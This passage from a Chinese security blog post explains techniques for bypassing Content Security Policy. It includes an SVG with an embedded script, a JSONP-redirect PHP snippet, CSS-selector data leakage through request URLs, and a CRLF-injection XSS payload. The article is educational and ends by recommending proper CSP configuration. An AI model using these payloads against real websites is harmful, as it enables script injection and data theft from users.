<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="meta-string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">id</span>=<span class="string">"Layer_1"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">x</span>=<span class="string">"0px"</span> <span class="attr">y</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 751 751"</span> <span class="attr">enable-background</span>=<span class="string">"new 0 0 751 751"</span> <span class="attr">xml:space</span>=<span class="string">"preserve"</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">"image0"</span> <span class="attr">width</span>=<span class="string">"751"</span> <span class="attr">height</span>=<span class="string">"751"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="可控-JSONP-绕过"><a href="#可控-JSONP-绕过" class="headerlink" title="可控 JSONP 绕过"></a>可控 JSONP 绕过</h3><p>通过 JSONP 返回 js 数据，再借助 script 加载 js</p>
<p>举个栗子</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://ip/js.php?f"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>js.php 内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: application/javascript'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        $src = <span class="string">'http://baidu.com'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'window.location="'</span>.$src.<span class="string">'"'</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>即可成功跳转，这种情况利用姿势很多，比如执行任意 js 函数等等</p>
<h3 id="object-src-绕过"><a href="#object-src-绕过" class="headerlink" title="object-src 绕过"></a>object-src 绕过</h3><p>object-src 用于设置插件，所以说，如果站点 CSP 设置没有 object-src 或值非 ‘none’ 则可以利用插件 js 执行弹窗或跳转操作</p>
<p>flash-xss 或者 pdf-xss</p>
<h3 id="缓存绕过-CSP-nonce"><a href="#缓存绕过-CSP-nonce" class="headerlink" title="缓存绕过 CSP nonce"></a>缓存绕过 CSP nonce</h3><p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">通过浏览器缓存来bypass CSP script nonce · LoRexxar&#39;s Blog</a></p>
<h3 id="CSS-选择器绕过-CSP"><a href="#CSS-选择器绕过-CSP" class="headerlink" title="CSS 选择器绕过 CSP"></a>CSS 选择器绕过 CSP</h3><p>CSS 选择器来读取页面内容，匹配到对应的属性，页面就会发出相应的请求</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*[attribute^="a"]&#123;background:url("record?match=a")&#125; </span><br><span class="line">*[attribute^="b"]&#123;background:url("record?match=b")&#125; </span><br><span class="line">*[attribute^="c"]&#123;background:url("record?match=c")&#125; [...]</span><br></pre></td></tr></table></figure>
<h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><p>通过 CRLF 可以注入 HTTP 头，也就可以注入 xss 代码</p>
<p>比如</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/?url=%0d%0a%0d%0a<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>详细可以看  phithon 的文章 <a href="https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html" target="_blank" rel="noopener">CRLF Injection</a></p>
<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>虽然 CSP 在很多时候并不能完全防御 XSS，但大多是因为配置不当等造成的，CSP 仍然有着它自身的价值，综合业务进行合理 CSP 配置并与其他技术结合才是正解</p>
<p>终极防护：全面禁止脚本</p>
<p>Reference:</p>
<p><a href="https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/" target="_blank" rel="noopener">https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/</a><br><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/09/csp.html</a><br><a href="https://xz.aliyun.com/t/5084" target="_blank" rel="noopener">https://xz.aliyun.com/t/5084</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2019/11/19/csp-bypass/">http://j0k3r.top/2019/11/19/csp-bypass/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CSP/">CSP</a><a class="post-meta__tags" href="/tags/前端/">前端</a></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/01/05/nessus-crack/"><i class="fa fa-chevron-left">  </i><span>Nessus v8.x 永久破解方法</span></a></div><div class="next-post pull-right"><a href="/2019/10/12/ThinkPHP_pop_v5.1.x/"><span>ThinkPHP v5.1.x POP 链分析</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'true' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'yeOeLCiDRMa7CAnJy2jxA2IY-gzGzoHsz',
  appKey:'eAgtubAYTMshS76hpc1F1UBG',
  placeholder:'Just go go',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2021 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/assets/katou_01.model.json"},"display":{"superSample":2,"width":300,"height":600,"position":"left","hOffset":-20,"vOffset":-80},"log":false,"tagMode":false});</script></body></html>